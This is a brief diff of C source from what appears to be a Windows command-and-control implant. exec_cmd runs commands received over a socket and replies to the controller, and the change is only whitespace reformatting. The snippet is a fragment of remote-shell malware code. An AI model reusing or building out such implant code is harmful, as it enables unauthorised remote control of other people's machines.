@@ -49,8 +49,8 @@ int c2_connect(const SOCKET connect_socket) {
 BOOL exec_cmd(const SOCKET connect_socket, char* const buf) {
 	BOOL i_result = sakito_win_cp(connect_socket, buf);
 
-    if (send(connect_socket, "\x11\x13\xcf", 3, 0) < 1)
-    	return SOCKET_ERROR;
+	if (send(connect_socket, "\x11\x13\xcf", 3, 0) < 1)
+		return SOCKET_ERROR;
 
 	return i_result;
 }
